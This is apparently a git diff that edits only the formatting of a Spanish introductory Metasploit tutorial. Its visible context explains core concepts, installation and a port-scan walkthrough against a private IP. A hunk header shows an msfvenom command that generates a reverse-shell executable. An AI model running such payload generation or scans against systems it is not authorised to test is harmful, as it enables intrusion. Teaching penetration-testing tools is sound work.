@@ -15,17 +15,17 @@ author: Conde
     - [Instalación](#instalación)
 
 ### Definición
-Metasploit es un proyecto de código abierto para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad
+Metasploit es un proyecto de **código abierto** para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad
 y ayuda en tests de penetración "Pentesting". Para usar esta herramienta no necesitas tener conocimientos de lo que hace, ya que te lo dan 
-todo automatizado, de forma que solo hay que hacer unos pequeños ajustes. En mi opinión no me gust utilizarlo, pero un hacker, debe saber 
-utilizar todas las herramientas posibles, por si algún dia le es necesario. 
+**todo automatizado**, de forma que solo hay que hacer unos pequeños ajustes. En mi opinión no me gust utilizarlo, pero un hacker, debe saber 
+utilizar todas las herramientas posibles, por si algún día le es necesario. 
 
 ### Conceptos 
 Antes de utilizarlo, es importante tener unos conceptos claros, estos son: 
-- Payload ➜ Un payload es la parte del código del malware que realiza la acción maliciosa en el sistema.
-- Exploit ➜ Es cualquier ataque que aprovecha las vulnerabilidades de las aplicaciones, las redes, los sistemas operativos o el hardware.
-- Handler ➜ Handler es un listener (Similiar a netcat).
-- Meterpreter ➜ Este concepto sale mucho en metasploit, este es un tipo de payload que te otorga un shell super potente.
+- **Payload** ➜ Un payload es la parte del código del malware que realiza la acción maliciosa en el sistema.
+- **Exploit** ➜ Es cualquier ataque que aprovecha las vulnerabilidades de las aplicaciones, las redes, los sistemas operativos o el hardware.
+- **Handler** ➜ Handler es un listener (Similiar a netcat).
+- **Meterpreter** ➜ Este concepto sale mucho en metasploit, este es un tipo de payload que te otorga un shell super potente.
 
 Dentro de metasploit hay una serie de directorios importantes que son: 
 - **El directorio principal (En Kali, Parrot)** ➜ /usr/share/metasploit-framework 
@@ -43,6 +43,7 @@ Los tres directorios importantes son:
 ### Uso 
 #### Instalación 
 Para instalar metasploit solo es necesario ejecutar el siguiente comando: 
+
 En debian y derivadas
 ```bash
 apt-get install metasploit -y 
@@ -91,35 +92,35 @@ msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888 -f exe -o s
 
 #### Ejemplo
 Ahora veremos un ejemplo de uso de metasploit, para realizar un escaneo de puertos. 
-1. Comezamos lanzando metasploit 
+\1. Comezamos lanzando metasploit 
 
 ```bash
 msfconsole
 ```
-2. Buscamos el exploit relacionado 
+\2. Buscamos el exploit relacionado 
 
 ```bash
 search portscan 
 ```
-3. Usamos el exploit que escogamos 
+\3. Usamos el exploit que escogamos 
 
 ```bash
 use /auxiliary/scanner/portscan/tcp 
 ```
 
-4. Vemos las opciones del exploit 
+\4. Vemos las opciones del exploit 
 
 ```bash
 show options 
 ```
 
-5. Configuramos las variables necesarios (Yes)
+\5. Configuramos las variables necesarios (Yes)
 
 ```bash
 set rhosts 192.168.20.123 
 ```
 
-6. Lo lanzamos 
+\6. Lo lanzamos 
 
 ```bash
 exploit 
